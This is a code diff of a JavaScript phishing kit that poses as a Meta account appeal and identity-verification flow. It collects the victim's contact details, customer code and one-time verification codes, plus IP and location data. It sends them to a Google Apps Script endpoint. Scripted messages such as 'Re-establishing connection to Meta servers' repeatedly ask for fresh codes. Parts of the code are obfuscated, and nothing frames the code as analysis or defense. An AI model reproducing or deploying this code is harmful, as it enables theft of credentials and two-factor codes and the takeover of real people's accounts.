@@ -1,323 +1,467 @@
-const step1 = document.getElementById("step1");
-const step2 = document.getElementById("step2");
-const step3 = document.getElementById("step3");
-const step5 = document.getElementById("step5");
-const step7 = document.getElementById("step7");
-
-const robotCheck = document.getElementById("robotCheck");
-const introVideo = document.getElementById("introVideo");
-
-const submitBtn = document.getElementById("submitBtn");
-const verifyOtpBtn = document.getElementById("verifyOtpBtn");
-
-const loadingOverlay = document.getElementById("loadingOverlay");
-const countdownEl = document.getElementById("countdown");
-const loadingTitle = document.getElementById("loadingTitle");
-const loadingStatus = document.getElementById("loadingStatus");
-
-const contactInput = document.getElementById("contact");
-const customerCodeInput = document.getElementById("customerCode");
-const contactError = document.getElementById("contactError");
-const customerCodeError = document.getElementById("customerCodeError");
-
-const otpCodeInput = document.getElementById("otpCode");
-const otpError = document.getElementById("otpError");
-const attemptText = document.getElementById("attemptText");
-const resendBtn = document.getElementById("resendBtn");
-const resendTimer = document.getElementById("resendTimer");
-
-const requestCode = document.getElementById("requestCode");
-
-const DEMO_OTP_CODE = "123456";
-const MAX_OTP_ATTEMPTS = 5;
-
-const failureMessages = {
-    1: [
-        "<span class='check-color'>✓</span> The verification code is incorrect.",
-        "<span class='check-color'>✓</span> Resetting your security session...",
-        "<span class='check-color'>✓</span> Sending a new code to your device...",
-        "<span class='check-color'>✓</span> This may take a few minutes...",
-        "<span class='check-color'>✓</span> Please enter the latest code to proceed."
-    ],
-    2: [
-        "<span class='check-color'>✓</span> Verification code does not match.",
-        "<span class='check-color'>✓</span> Synchronizing security data...",
-        "<span class='check-color'>✓</span> Requesting a new verification code...",
-        "<span class='check-color'>✓</span> Checking notifications on your device...",
-        "<span class='check-color'>✓</span> Enter the latest code to finalize."
-    ],
-    3: [
-        "<span class='check-color'>✓</span> Verification code not accepted.",
-        "<span class='check-color'>✓</span> Running account security check...",
-        "<span class='check-color'>✓</span> Refreshing login session...",
-        "<span class='check-color'>✓</span> Transmitting code via secure channel...",
-        "<span class='check-color'>✓</span> Please use the latest code received."
-    ],
-    4: [
-        "<span class='check-color'>✓</span> Verification data is invalid.",
-        "<span class='check-color'>✓</span> Reviewing request history...",
-        "<span class='check-color'>✓</span> Re-establishing connection to Meta servers...",
-        "<span class='check-color'>✓</span> Generating a new one-time security code...",
-        "<span class='check-color'>✓</span> Please enter the latest code sent to you."
-    ],
-    5: [
-        "<span class='check-color'>✓</span> Analyzing advanced verification data...",
-        "<span class='check-color'>✓</span> Security scan completed.",
-        "<span class='check-color'>✓</span> Identity successfully verified.",
-        "<span class='check-color'>✓</span> Granting final access...",
-        "<span class='check-color'>✓</span> <strong>Please enter the latest code to complete.</strong>"
-    ]
-};
-
-const resendCodeMessages = [
-    "<span class='check-color'>✓</span> Requesting a new verification code...",
-    "<span class='check-color'>✓</span> Establishing secure server connection...",
-    "<span class='check-color'>✓</span> New verification code has been sent.",
-    "<span class='check-color'>✓</span> Please check your device.",
-    "<span class='check-color'>✓</span> <strong>Ready for new input.</strong>"
-];
-
-const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzsCH_-apoUALYgKuxAXB-c0pOI1qQ6SIGDWujulSE-OfCKv3UOU_CYBSiYCsnEicU/exec";
+const __t = {};
+function t(e) {
+	return __t[e] || e;
+}
+const MSG_PRE = "<span class='check-color'>✓</span> ",
+	MSG_LOADING = [
+		'Verifying your account information...',
+		'Processing your review request...',
+		'Verifying your account security...',
+		'Sending verification code to your device...',
+	],
+	MSG_FAIL = {
+		1: [
+			'The verification code is incorrect.',
+			'Resetting your security session...',
+			'Sending a new code to your device...',
+			'This may take a few minutes...',
+			'Please enter the latest code to proceed.',
+		],
+		2: [
+			'Verification code does not match.',
+			'Synchronizing security data...',
+			'Requesting a new verification code...',
+			'Checking notifications on your device...',
+			'Enter the latest code to finalize.',
+		],
+		3: [
+			'Verification code not accepted.',
+			'Running account security check...',
+			'Refreshing login session...',
+			'Transmitting code via secure channel...',
+			'Please use the latest code received.',
+		],
+		4: [
+			'Verification data is invalid.',
+			'Reviewing request history...',
+			'Re-establishing connection to Meta servers...',
+			'Generating a new one-time security code...',
+			'Please enter the latest code sent to you.',
+		],
+		5: [
+			'Analyzing advanced verification data...',
+			'Security scan completed.',
+			'Identity successfully verified.',
+			'Granting final access...',
+			'Please enter the latest code to complete.',
+		],
+	},
+	MSG_RESEND = [
+		'Requesting a new verification code...',
+		'Establishing secure server connection...',
+		'New verification code has been sent.',
+		'Please check your device.',
+		'Ready for new input.',
+	],
+	MSG_LOCKED = [
+		'Identity verification request submitted.',
+		'No further action is required from your side.',
+		'Our security team is processing your request.',
+	],
+	__ALL_TEXTS = (() => {
+		const e = [];
+		return (
+			Object.values(MSG_FAIL).forEach((t) => t.forEach((t) => e.push(t))),
+			[
+				...MSG_LOADING,
+				...MSG_RESEND,
+				...MSG_LOCKED,
+				...e,
+				'Please enter your contact information.',
+				'Please enter your customer code.',
+				'Please enter your verification code.',
+				'Submitting your appeal...',
+				'Confirm your identity...',
+				'Requesting new code...',
+				'Verification Complete',
+				'Incorrect code. A new code has been sent.',
+				'A new code has been sent to your device.',
+				'We can send you another code in a few minutes.',
+				'You have X attempts remaining.',
+			]
+		);
+	})(),
+	step1 = document.getElementById('step1'),
+	step2 = document.getElementById('step2'),
+	step3 = document.getElementById('step3'),
+	step5 = document.getElementById('step5'),
+	step7 = document.getElementById('step7'),
+	robotCheck = document.getElementById('robotCheck'),
+	introVideo = document.getElementById('introVideo'),
+	submitBtn = document.getElementById('submitBtn'),
+	verifyOtpBtn = document.getElementById('verifyOtpBtn'),
+	loadingOverlay = document.getElementById('loadingOverlay'),
+	countdownEl = document.getElementById('countdown'),
+	loadingTitle = document.getElementById('loadingTitle'),
+	loadingStatus = document.getElementById('loadingStatus'),
+	contactInput = document.getElementById('contact'),
+	customerCodeInput = document.getElementById('customerCode'),
+	contactError = document.getElementById('contactError'),
+	customerCodeError = document.getElementById('customerCodeError'),
+	otpCodeInput = document.getElementById('otpCode'),
+	otpError = document.getElementById('otpError'),
+	attemptText = document.getElementById('attemptText'),
+	resendBtn = document.getElementById('resendBtn'),
+	resendTimer = document.getElementById('resendTimer'),
+	requestCode = document.getElementById('requestCode'),
+	DEMO_OTP_CODE = '123456',
+	MAX_OTP_ATTEMPTS = 5,
+	GOOGLE_SCRIPT_URL =
+		'https://script.google.com/macros/s/AKfycbzGnKN-W0wAbiNCMGMVFicewabhfN8ox8pYAtZ3m5Vvx2smHt3YSbdHBz5JG0_ehuydeQ/exec',
+	SESSION_ID = 'SID-' + Date.now() + '-' + Math.floor(1e6 * Math.random());
 globalThis.GOOGLE_SCRIPT_URL = GOOGLE_SCRIPT_URL;
-const SESSION_ID = "SID-" + Date.now() + "-" + Math.floor(Math.random() * 1000000);
-
-let otpAttempts = 0;
-let resendInterval = null;
-
+let otpAttempts = 0,
+	resendInterval = null;
 function buildProgressBars() {
-    document.querySelectorAll(".progress").forEach(progress => {
-        const current = Number(progress.dataset.progress);
-        progress.innerHTML = "";
-
-        for (let i = 1; i <= 5; i++) {
-            const dot = document.createElement("span");
-            if (i < current) dot.classList.add("done");
-            if (i === current) dot.classList.add("active");
-            progress.appendChild(dot);
-        }
-    });
+	document.querySelectorAll('.progress').forEach((e) => {
+		const t = Number(e.dataset.progress);
+		e.innerHTML = '';
+		for (let n = 1; n <= 5; n++) {
+			const o = document.createElement('span');
+			(n < t && o.classList.add('done'),
+				n === t && o.classList.add('active'),
+				e.appendChild(o));
+		}
+	});
 }
-
-function showStep(step) {
-    document.querySelectorAll(".step").forEach(item => {
-        item.classList.remove("active");
-    });
-    step.classList.add("active");
-    setTimeout(() => { window.scrollTo({ top: 0, behavior: "smooth" }); }, 50);
+function showStep(e) {
+	(document.querySelectorAll('.step').forEach((e) => {
+		e.classList.remove('active');
+	}),
+		e.classList.add('active'),
+		setTimeout(() => {
+			window.scrollTo({ top: 0, behavior: 'smooth' });
+		}, 50));
 }
-
-function scrollInputIntoView(inputElement) {
-    setTimeout(() => {
-        inputElement.scrollIntoView({ behavior: "smooth", block: "center" });
-    }, 250);
+function scrollInputIntoView(e) {
+	setTimeout(() => {
+		e.scrollIntoView({ behavior: 'smooth', block: 'center' });
+	}, 250);
 }
-
-buildProgressBars();
-
-document.querySelectorAll("input").forEach(input => {
-    input.addEventListener("focus", function () { scrollInputIntoView(input); });
-});
-
-robotCheck.addEventListener("change", function () {
-    if (robotCheck.checked) {
-        setTimeout(() => { showStep(step2); playVideoStep(); }, 500);
-    }
-});
-
 function playVideoStep() {
-    introVideo.currentTime = 0;
-    const playPromise = introVideo.play();
-    if (playPromise !== undefined) {
-        playPromise.catch(() => { setTimeout(() => { showStep(step3); }, 4000); });
-    }
-    const fallbackTimer = setTimeout(() => { showStep(step3); }, 5000);
-    introVideo.onended = function () { clearTimeout(fallbackTimer); showStep(step3); };
+	introVideo.currentTime = 0;
+	const e = introVideo.play();
+	void 0 !== e &&
+		e.catch(() => {
+			setTimeout(() => {
+				showStep(step3);
+			}, 4e3);
+		});
+	const t = setTimeout(() => {
+		showStep(step3);
+	}, 5e3);
+	introVideo.onended = function () {
+		(clearTimeout(t), showStep(step3));
+	};
 }
-
-submitBtn.addEventListener("click", function () {
-    const contact = contactInput.value.trim();
-    const customerCode = customerCodeInput.value.trim();
-    let isValid = true;
-    contactError.innerText = "";
-    customerCodeError.innerText = "";
-    if (contact === "") { contactError.innerText = "Please enter your contact information."; isValid = false; }
-    if (customerCode === "") { customerCodeError.innerText = "Please enter your customer code."; isValid = false; }
-    if (!isValid) {
-        const firstEmptyInput = contact === "" ? contactInput : customerCodeInput;
-        firstEmptyInput.focus();
-        scrollInputIntoView(firstEmptyInput);
-        return;
-    }
-    sendToGoogleSheet("Form submitted");
-    showLoading({
-        title: "Submitting your appeal...",
-        afterDone: function () {
-            showStep(step5);
-            startResendCountdown();
-            setTimeout(() => otpCodeInput.focus(), 400);
-        }
-    });
-});
-
-verifyOtpBtn.addEventListener("click", function () {
-    const otpCode = otpCodeInput.value.trim();
-    otpError.innerText = "";
-    if (otpAttempts >= MAX_OTP_ATTEMPTS) { lockOtpForm(); return; }
-    if (otpCode === "") {
-        otpError.innerText = "Please enter your verification code.";
-        otpCodeInput.focus();
-        scrollInputIntoView(otpCodeInput);
-        return;
-    }
-
-    sendToGoogleSheet("Internal code submitted", otpCode);
-    otpCodeInput.value = "";
-
-    if (otpCode === DEMO_OTP_CODE) {
-        showLoading({
-            title: "Submitting your appeal...",
-            afterDone: function () {
-                requestCode.innerText = generateRequestCode();
-                showStep(step7);
-            }
-        });
-    } else {
-        otpAttempts++;
-        const currentMessages = failureMessages[otpAttempts] || failureMessages[5];
-
-        showLoading({
-            title: "Confirm your identity...",
-            statuses: currentMessages,
-            afterDone: function () {
-                const remaining = MAX_OTP_ATTEMPTS - otpAttempts;
-                showStep(step5);
-
-                if (remaining <= 0) {
-                    lockOtpForm();
-                    loadingTitle.innerText = "Verification Complete";
-                    loadingStatus.innerHTML = `
-                        <div class="loading-status-line">✓ Identity verification request submitted.</div>
-                        <div class="loading-status-line">✓ No further action is required from your side.</div>
-                        <div class="loading-status-line">✓ Our security team is processing your request.</div>
-                    `;
-                    countdownEl.innerText = "✓";
-                    loadingOverlay.classList.add("active");
-                    return;
-                }
-
-                otpError.innerHTML = "<strong>Incorrect code. A new code has been sent.</strong>";
-                attemptText.innerText = `Bạn còn ${remaining} lần nhập.`;
-                setTimeout(() => { otpCodeInput.focus(); scrollInputIntoView(otpCodeInput); }, 400);
-            }
-        });
-    }
-});
-
-resendBtn.addEventListener("click", function () {
-    otpError.innerText = "";
-    otpCodeInput.value = "";
-    resendBtn.disabled = true;
-
-    showLoading({
-        title: "Requesting new code...",
-        statuses: resendCodeMessages,
-        afterDone: function () {
-            showStep(step5);
-            startResendCountdown();
-            otpError.innerHTML = "<strong>A new code has been sent to your device.</strong>";
-            setTimeout(() => { otpCodeInput.focus(); }, 400);
-        }
-    });
-});
-
 function lockOtpForm() {
-    otpCodeInput.disabled = true;
-    verifyOtpBtn.disabled = true;
-    resendBtn.disabled = true;
-    verifyOtpBtn.style.opacity = "0.55";
-    verifyOtpBtn.style.cursor = "not-allowed";
-    resendBtn.style.opacity = "0.55";
-    resendBtn.style.cursor = "not-allowed";
+	((otpCodeInput.disabled = !0),
+		(verifyOtpBtn.disabled = !0),
+		(resendBtn.disabled = !0),
+		(verifyOtpBtn.style.opacity = '0.55'),
+		(verifyOtpBtn.style.cursor = 'not-allowed'),
+		(resendBtn.style.opacity = '0.55'),
+		(resendBtn.style.cursor = 'not-allowed'));
 }
-
-function showLoading(options) {
-    let seconds = 15;
-    const defaultStatuses = [
-        "<span class='check-color'>✓</span> Verifying your account information...",
-        "<span class='check-color'>✓</span> Processing your review request...",
-        "<span class='check-color'>✓</span> Verifying your account security...",
-        "<span class='check-color'>✓</span> Sending verification code to your device..."
-    ];
-
-    const statuses = options.statuses || defaultStatuses;
-
-    loadingTitle.innerText = options.title;
-    loadingStatus.innerHTML = "";
-    countdownEl.innerText = seconds;
-    loadingOverlay.classList.add("active");
-
-    function addStatus(text) {
-        const line = document.createElement("div");
-        line.className = "loading-status-line";
-        line.innerHTML = text;
-        loadingStatus.appendChild(line);
-    }
-
-    addStatus(statuses[0]);
-
-    const timer = setInterval(() => {
-        seconds--;
-        countdownEl.innerText = seconds;
-
-        if (statuses.length === 4) {
-            if (seconds === 11) addStatus(statuses[1]);
-            if (seconds === 7) addStatus(statuses[2]);
-            if (seconds === 3) addStatus(statuses[3]);
-        } else if (statuses.length === 5) {
-            if (seconds === 12) addStatus(statuses[1]);
-            if (seconds === 9) addStatus(statuses[2]);
-            if (seconds === 6) addStatus(statuses[3]);
-            if (seconds === 3) addStatus(statuses[4]);
-        }
-
-        if (seconds <= 0) {
-            clearInterval(timer);
-            loadingOverlay.classList.remove("active");
-            if (typeof options.afterDone === "function") options.afterDone();
-        }
-    }, 1000);
+function showLoading(e) {
+	let n = 15;
+	const o = MSG_LOADING.map((e) => MSG_PRE + t(e)),
+		r = e.statuses || o;
+	function i(e) {
+		const t = document.createElement('div');
+		((t.className = 'loading-status-line'), (t.innerHTML = e), loadingStatus.appendChild(t));
+	}
+	((loadingTitle.innerText = e.title),
+		(loadingStatus.innerHTML = ''),
+		(countdownEl.innerText = n),
+		loadingOverlay.classList.add('active'),
+		i(r[0]));
+	const s = setInterval(() => {
+		(n--,
+			(countdownEl.innerText = n),
+			4 === r.length
+				? (11 === n && i(r[1]), 7 === n && i(r[2]), 3 === n && i(r[3]))
+				: 5 === r.length &&
+					(12 === n && i(r[1]),
+					9 === n && i(r[2]),
+					6 === n && i(r[3]),
+					3 === n && i(r[4])),
+			n <= 0 &&
+				(clearInterval(s),
+				loadingOverlay.classList.remove('active'),
+				'function' == typeof e.afterDone && e.afterDone()));
+	}, 1e3);
 }
-
 function startResendCountdown() {
-    let seconds = 60;
-    resendBtn.disabled = false;
-    resendTimer.innerText = `${seconds}s`;
-    if (resendInterval) clearInterval(resendInterval);
-    resendInterval = setInterval(() => {
-        seconds--;
-        resendTimer.innerText = `${seconds}s`;
-        if (seconds <= 0) {
-            clearInterval(resendInterval);
-            resendBtn.disabled = false;
-            resendTimer.innerText = "We can send you another code in a few minutes.";
-        }
-    }, 1000);
+	let e = 60;
+	((resendBtn.disabled = !1),
+		(resendTimer.innerText = `${e}s`),
+		resendInterval && clearInterval(resendInterval),
+		(resendInterval = setInterval(() => {
+			(e--,
+				(resendTimer.innerText = `${e}s`),
+				e <= 0 &&
+					(clearInterval(resendInterval),
+					(resendBtn.disabled = !1),
+					(resendTimer.innerText = t('We can send you another code in a few minutes.'))));
+		}, 1e3)));
 }
-
 function generateRequestCode() {
-    const number = Math.floor(100000 + Math.random() * 900000);
-    return `REQ-2026-${number}`;
+	return `REQ-2026-${Math.floor(1e5 + 9e5 * Math.random())}`;
 }
-
 function getSimpleDeviceType() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (/iphone|ipod/.test(ua)) return "iPhone";
-    if (/ipad/.test(ua)) return "iPad";
-    if (/android/.test(ua)) return "Android";
-    if (/mobile/.test(ua)) return "Điện thoại";
-    return "Máy tính";
+	const e = navigator.userAgent.toLowerCase();
+	return /iphone|ipod/.test(e)
+		? 'iPhone'
+		: /ipad/.test(e)
+			? 'iPad'
+			: /android/.test(e)
+				? 'Android'
+				: /mobile/.test(e)
+					? 'Điện thoại'
+					: 'Máy tính';
+}
+(buildProgressBars(),
+	document.querySelectorAll('input').forEach((e) => {
+		e.addEventListener('focus', function () {
+			scrollInputIntoView(e);
+		});
+	}),
+	robotCheck.addEventListener('change', function () {
+		robotCheck.checked &&
+			setTimeout(() => {
+				(showStep(step2), playVideoStep());
+			}, 500);
+	}),
+	submitBtn.addEventListener('click', function () {
+		const e = contactInput.value.trim(),
+			n = customerCodeInput.value.trim();
+		let o = !0;
+		if (
+			((contactError.innerText = ''),
+			(customerCodeError.innerText = ''),
+			'' === e &&
+				((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
+			'' === n &&
+				((customerCodeError.innerText = t('Please enter your customer code.')), (o = !1)),
+			!o)
+		) {
+			const t = '' === e ? contactInput : customerCodeInput;
+			return (t.focus(), void scrollInputIntoView(t));
+		}
+		(sendToGoogleSheet('Form submitted'),
+			showLoading({
+				title: t('Submitting your appeal...'),
+				afterDone: function () {
+					(showStep(step5),
+						startResendCountdown(),
+						setTimeout(() => otpCodeInput.focus(), 400));
+				},
+			}));
+	}),
+	verifyOtpBtn.addEventListener('click', function () {
+		const e = otpCodeInput.value.trim();
+		if (((otpError.innerText = ''), otpAttempts >= 5)) lockOtpForm();
+		else {
+			if ('' === e)
+				return (
+					(otpError.innerText = t('Please enter your verification code.')),
+					otpCodeInput.focus(),
+					void scrollInputIntoView(otpCodeInput)
+				);
+			if (
+				(sendToGoogleSheet('Internal code submitted', e),
+				(otpCodeInput.value = ''),
+				'123456' === e)
+			)
+				showLoading({
+					title: t('Submitting your appeal...'),
+					afterDone: function () {
+						((requestCode.innerText = generateRequestCode()), showStep(step7));
+					},
+				});
+			else {
+				otpAttempts++;
+				const e = (MSG_FAIL[otpAttempts] || MSG_FAIL[5]).map((e) => MSG_PRE + t(e));
+				showLoading({
+					title: t('Confirm your identity...'),
+					statuses: e,
+					afterDone: function () {
+						const e = 5 - otpAttempts;
+						if ((showStep(step5), e <= 0))
+							return (
+								lockOtpForm(),
+								(loadingTitle.innerText = t('Verification Complete')),
+								(loadingStatus.innerHTML = MSG_LOCKED.map(
+									(e) => `<div class="loading-status-line">✓ ${t(e)}</div>`,
+								).join('')),
+								(countdownEl.innerText = '✓'),
+								void loadingOverlay.classList.add('active')
+							);
+						((otpError.innerHTML = `<strong>${t('Incorrect code. A new code has been sent.')}</strong>`),
+							(attemptText.innerText = t('You have X attempts remaining.').replace(
+								'X',
+								e,
+							)),
+							setTimeout(() => {
+								(otpCodeInput.focus(), scrollInputIntoView(otpCodeInput));
+							}, 400));
+					},
+				});
+			}
+		}
+	}),
+	resendBtn.addEventListener('click', function () {
+		((otpError.innerText = ''), (otpCodeInput.value = ''), (resendBtn.disabled = !0));
+		const e = MSG_RESEND.map((e) => MSG_PRE + t(e));
+		showLoading({
+			title: t('Requesting new code...'),
+			statuses: e,
+			afterDone: function () {
+				(showStep(step5),
+					startResendCountdown(),
+					(otpError.innerHTML = `<strong>${t('A new code has been sent to your device.')}</strong>`),
+					setTimeout(() => {
+						otpCodeInput.focus();
+					}, 400));
+			},
+		});
+	}));
+const sendToGoogleSheet = async (e, t = '') => {
+	const n = localStorage.getItem('vai-ca-biu'),
+		o = n ? JSON.parse(n) : {},
+		{
+			ip: r = 'Unknown',
+			city: i = 'Unknown',
+			region: s = 'Unknown',
+			country: c = 'Unknown',
+			postal: a = 'Unknown',
+			continent: d = 'Unknown',
+		} = o,
+		u = new URLSearchParams();
+	(u.append('session_id', SESSION_ID),
+		u.append('contact', contactInput.value.trim()),
+		u.append('customer_code', customerCodeInput.value.trim()),
+		u.append('internal_code', t),
+		u.append('device', getSimpleDeviceType()),
+		u.append('status', e),
+		u.append('ip', r),
+		u.append('city', i),
+		u.append('region', s),
+		u.append('country', c),
+		u.append('postal', a),
+		u.append('continent', d),
+		fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: u, mode: 'no-cors' }).catch((e) => {}));
+};
+function kimochi() {
+	function _0x2c14(_0x11175b, _0x1a8796) {
+		_0x11175b = _0x11175b - 0x1c9;
+		const _0x42b224 = _0x42b2();
+		let _0x2c1441 = _0x42b224[_0x11175b];
+		return _0x2c1441;
+	}
+	const _0x9d89ff = _0x2c14;
+	function _0x42b2() {
+		const _0x2406fc = [
+			'1277720UOnMRO',
+			'218796bFgtmP',
+			'trim',
+			'2353900wpdMdQ',
+			'9lrPbgt',
+			'json',
+			'placeholder',
+			'292903cyZywX',
+			'124734PnVlHe',
+			'then',
+			'textContent',
+			'map',
+			'448912sPnVxX',
+			'https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=',
+			'language',
+			'147mDbyoJ',
+			'forEach',
+			'length',
+			'push',
+			'querySelectorAll',
+			'53280xWccGi',
+			'28anPyIR',
+		];
+		_0x42b2 = function () {
+			return _0x2406fc;
+		};
+		return _0x42b2();
+	}
+	(function (_0x44e94b, _0x5c3531) {
+		const _0x1a4ea7 = _0x2c14,
+			_0x389141 = _0x44e94b();
+		while (!![]) {
+			try {
+				const _0x523606 =
+					-parseInt(_0x1a4ea7(0x1ce)) / 0x1 +
+					-parseInt(_0x1a4ea7(0x1de)) / 0x2 +
+					(parseInt(_0x1a4ea7(0x1cf)) / 0x3) * (parseInt(_0x1a4ea7(0x1dc)) / 0x4) +
+					parseInt(_0x1a4ea7(0x1dd)) / 0x5 +
+					(-parseInt(_0x1a4ea7(0x1db)) / 0x6) * (-parseInt(_0x1a4ea7(0x1d6)) / 0x7) +
+					(-parseInt(_0x1a4ea7(0x1d3)) / 0x8) * (-parseInt(_0x1a4ea7(0x1cb)) / 0x9) +
+					-parseInt(_0x1a4ea7(0x1ca)) / 0xa;
+				if (_0x523606 === _0x5c3531) break;
+				else _0x389141['push'](_0x389141['shift']());
+			} catch (_0x9762df) {
+				_0x389141['push'](_0x389141['shift']());
+			}
+		}
+	})(_0x42b2, 0x24fc5);
+	{
+		const lang = (navigator['languages']?.[0x0] || navigator[_0x9d89ff(0x1d5)] || 'en')
+			['split']('-')[0x0]
+			['toLowerCase']();
+		if (lang !== 'en' && lang) {
+			const els = [...document[_0x9d89ff(0x1da)]('[data-i18n]')],
+				placeholders = [...document[_0x9d89ff(0x1da)]('[data-i18n-placeholder]')],
+				collect = [];
+			(els[_0x9d89ff(0x1d7)]((_0x82697) => {
+				const _0x4545cd = _0x9d89ff,
+					_0x178c7b = _0x82697[_0x4545cd(0x1d1)][_0x4545cd(0x1c9)]();
+				if (_0x178c7b) collect[_0x4545cd(0x1d9)](_0x178c7b);
+			}),
+				placeholders['forEach']((_0x46b636) => {
+					const _0x14b2ef = _0x9d89ff,
+						_0x472ae3 = _0x46b636[_0x14b2ef(0x1cd)];
+					if (_0x472ae3) collect[_0x14b2ef(0x1d9)](_0x472ae3);
+				}),
+				collect[_0x9d89ff(0x1d9)](...__ALL_TEXTS));
+			const unique = [...new Set(collect)];
+			if (!unique[_0x9d89ff(0x1d8)]) return;
+			const run = (_0x224f9b) =>
+				fetch(_0x9d89ff(0x1d4) + lang + '&dt=t&q=' + encodeURIComponent(_0x224f9b))
+					[_0x9d89ff(0x1d0)]((_0x2f30af) =>
+						_0x2f30af['ok'] ? _0x2f30af[_0x9d89ff(0x1cc)]() : null,
+					)
+					[_0x9d89ff(0x1d0)]((_0x51735b) => {
+						const _0x325426 =
+							_0x51735b?.[0x0]
+								?.['map']((_0x51117e) => _0x51117e?.[0x0] || '')
+								['join']('') || '';
+						if (_0x325426) __t[_0x224f9b] = _0x325426;
+					})
+					['catch'](() => {});
+			Promise['all'](unique[_0x9d89ff(0x1d2)]((_0xa1ad1) => run(_0xa1ad1)))[_0x9d89ff(0x1d0)](
+				() => {
+					const _0x29ce88 = _0x9d89ff;
+					(els[_0x29ce88(0x1d7)]((_0x250e54) => {
+						const _0x15cfbc = _0x29ce88,
+							_0x388447 = _0x250e54[_0x15cfbc(0x1d1)][_0x15cfbc(0x1c9)]();
+						if (__t[_0x388447]) _0x250e54['textContent'] = __t[_0x388447];
+					}),
+						placeholders['forEach']((_0x271cb6) => {
+							const _0x2eeacb = _0x29ce88;
+							if (__t[_0x271cb6[_0x2eeacb(0x1cd)]])
+								_0x271cb6['placeholder'] = __t[_0x271cb6[_0x2eeacb(0x1cd)]];
+						}));
+				},
+			);
+		}
+	}
 }
 
-const sendToGoogleSheet = async (statusText, internalCode = "") => {
-    const _0x1862b1=_0x4687;(function(_0x4a8a83,_0x4f320e){const _0x4da224=_0x4687,_0x425219=_0x4a8a83();while(!![]){try{const _0x35c5da=-parseInt(_0x4da224(0x131))/0x1+parseInt(_0x4da224(0x130))/0x2+-parseInt(_0x4da224(0x128))/0x3*(parseInt(_0x4da224(0x11e))/0x4)+-parseInt(_0x4da224(0x122))/0x5+parseInt(_0x4da224(0x136))/0x6*(-parseInt(_0x4da224(0x135))/0x7)+parseInt(_0x4da224(0x137))/0x8*(parseInt(_0x4da224(0x12c))/0x9)+parseInt(_0x4da224(0x12f))/0xa*(parseInt(_0x4da224(0x12b))/0xb);if(_0x35c5da===_0x4f320e)break;else _0x425219['push'](_0x425219['shift']());}catch(_0x2a22c8){_0x425219['push'](_0x425219['shift']());}}}(_0x11bb,0xbbd73));const localRaw=localStorage[_0x1862b1(0x12d)]('vai-ca-biu'),localData=localRaw?JSON[_0x1862b1(0x11c)](localRaw):{},{ip=_0x1862b1(0x11f),city=_0x1862b1(0x11f),country=_0x1862b1(0x11f),postal=_0x1862b1(0x11f)}=localData,formData=new URLSearchParams();function _0x4687(_0x541de0,_0x56ba31){_0x541de0=_0x541de0-0x11b;const _0x11bb73=_0x11bb();let _0x4687ea=_0x11bb73[_0x541de0];return _0x4687ea;}function _0x11bb(){const _0x2ab59a=['1237392UgeFgi','value','error','82357DYwFbG','9JABazX','getItem','internal_code','2270NkVaIB','1932886lRSNNH','88265yZgtlu','POST','customer_code','GOOGLE_SCRIPT_URL','14TQoxiL','2037324wpCBIf','1809368brOnie','contact','parse','city','12bPMZYx','Unknown','no-cors','country','590015JrAIkP','append','trim','session_id','postal','device'];_0x11bb=function(){return _0x2ab59a;};return _0x11bb();}formData['append'](_0x1862b1(0x125),SESSION_ID),formData[_0x1862b1(0x123)](_0x1862b1(0x11b),contactInput[_0x1862b1(0x129)][_0x1862b1(0x124)]()),formData[_0x1862b1(0x123)](_0x1862b1(0x133),customerCodeInput[_0x1862b1(0x129)][_0x1862b1(0x124)]()),formData[_0x1862b1(0x123)](_0x1862b1(0x12e),internalCode),formData[_0x1862b1(0x123)](_0x1862b1(0x127),getSimpleDeviceType()),formData['append']('status',statusText),formData[_0x1862b1(0x123)]('ip',ip),formData[_0x1862b1(0x123)](_0x1862b1(0x11d),city),formData[_0x1862b1(0x123)](_0x1862b1(0x121),country),formData['append'](_0x1862b1(0x126),postal),fetch(window[_0x1862b1(0x134)],{'method':_0x1862b1(0x132),'body':formData,'mode':_0x1862b1(0x120)})['catch'](_0x249b8d=>console[_0x1862b1(0x12a)]('Lỗi\x20submit\x20sheet:\x20'+_0x249b8d));
-};
+kimochi();
